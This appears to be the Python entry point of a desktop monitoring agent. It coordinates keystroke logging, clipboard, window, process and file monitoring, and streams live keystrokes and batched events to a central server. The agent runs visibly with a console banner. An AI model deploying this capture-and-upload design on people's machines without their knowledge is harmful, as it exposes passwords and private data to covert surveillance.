"""
Desktop Monitoring Agent - Main Entry Point
"""
import sys
import signal
import time
import argparse
from typing import List

from .config import DEBUG_MODE, SERVER_URL
from .monitors import (
    KeystrokeLogger,
    WindowTracker,
    ClipboardMonitor,
    ProcessMonitor,
    FileWatcher
)
from .collectors import EventQueue, EventSender


class MonitoringAgent:
    """Main agent that coordinates all monitoring modules"""
    
    def __init__(self, server_url: str = None):
        self.running = False
        
        # Initialize event sender
        self.sender = EventSender()
        if server_url:
            self.sender.config.server_url = server_url
        
        # Initialize event queue with sender callback
        self.event_queue = EventQueue(self.sender.send_events)
        
        # Initialize monitors with event callback
        # Pass live keystroke callback for real-time streaming
        self.keystroke_logger = KeystrokeLogger(
            self._on_event,
            live_keystroke_callback=self._on_live_keystroke
        )
        self.window_tracker = WindowTracker(
            self._on_event, 
            keystroke_logger=self.keystroke_logger,
            live_window_callback=self._on_live_window_event
        )
        self.clipboard_monitor = ClipboardMonitor(
            self._on_event,
            window_tracker=self.window_tracker
        )
        self.process_monitor = ProcessMonitor(self._on_event)
        self.file_watcher = FileWatcher(
            self._on_event,
            window_tracker=self.window_tracker
        )
        
        # All monitors list
        self.monitors = [
            self.keystroke_logger,
            self.window_tracker,
            self.clipboard_monitor,
            self.process_monitor,
            self.file_watcher
        ]
    
    def _on_event(self, event: dict):
        """Callback for all monitors to submit events (batched)"""
        self.event_queue.add_event(event)
    
    def _on_live_keystroke(self, event: dict):
        """Callback for real-time keystroke streaming"""
        self.sender.send_live_keystroke(event)
    
    def _on_live_window_event(self, event: dict):
        """Callback for real-time window events (open/close/focus)"""
        self.sender.send_live_window_event(event)
    
    def start(self):
        """Start all monitoring modules"""
        if self.running:
            return
        
        print("=" * 50)
        print("  MONITOR AGENT")
        print("  Desktop Monitoring Agent")
        print("=" * 50)
        print(f"\n  Server: {self.sender.config.server_url}")
        print(f"  Debug: {DEBUG_MODE}")
        print("\n" + "=" * 50)
        
        self.running = True
        
        # Register with server
        print("\nRegistering with server...")
        if self.sender.register():
            print("✓ Registered successfully")
        else:
            print("✗ Registration failed (will retry)")
        
        # Start components
        print("\nStarting monitors...")
        self.event_queue.start()
        self.sender.start_heartbeat()
        
        for monitor in self.monitors:
            try:
                monitor.start()
                print(f"  ✓ {monitor.__class__.__name__}")
            except Exception as e:
                print(f"  ✗ {monitor.__class__.__name__}: {e}")
        
        print("\n" + "=" * 50)
        print("  Agent running. Press Ctrl+C to stop.")
        print("=" * 50 + "\n")
    
    def stop(self):
        """Stop all monitoring modules"""
        if not self.running:
            return
        
        print("\nStopping agent...")
        self.running = False
        
        # Stop monitors
        for monitor in self.monitors:
            try:
                monitor.stop()
            except Exception:
                pass
        
        # Stop sender and queue
        self.sender.stop_heartbeat()
        self.event_queue.stop()
        
        print("Agent stopped.")
    
    def run_forever(self):
        """Run the agent until interrupted"""
        self.start()
        
        # Set up signal handlers
        def signal_handler(sig, frame):
            print("\nInterrupt received...")
            self.stop()
            sys.exit(0)
        
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        
        # Keep running
        try:
            while self.running:
                time.sleep(1)
                
                if DEBUG_MODE:
                    # Print queue status periodically
                    if int(time.time()) % 30 == 0:
                        print(f"Queue size: {self.event_queue.get_queue_size()}")
                        
        except KeyboardInterrupt:
            pass
        finally:
            self.stop()


def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(description='Desktop Monitoring Agent')
    parser.add_argument(
        '--server', '-s',
        default=SERVER_URL,
        help='Central server URL (default: http://localhost:5000)'
    )
    parser.add_argument(
        '--debug', '-d',
        action='store_true',
        help='Enable debug output'
    )
    
    args = parser.parse_args()
    
    # Set debug mode
    if args.debug:
        import src.config
        src.config.DEBUG_MODE = True
    
    # Create and run agent
    agent = MonitoringAgent(server_url=args.server)
    agent.run_forever()


if __name__ == '__main__':
    main()

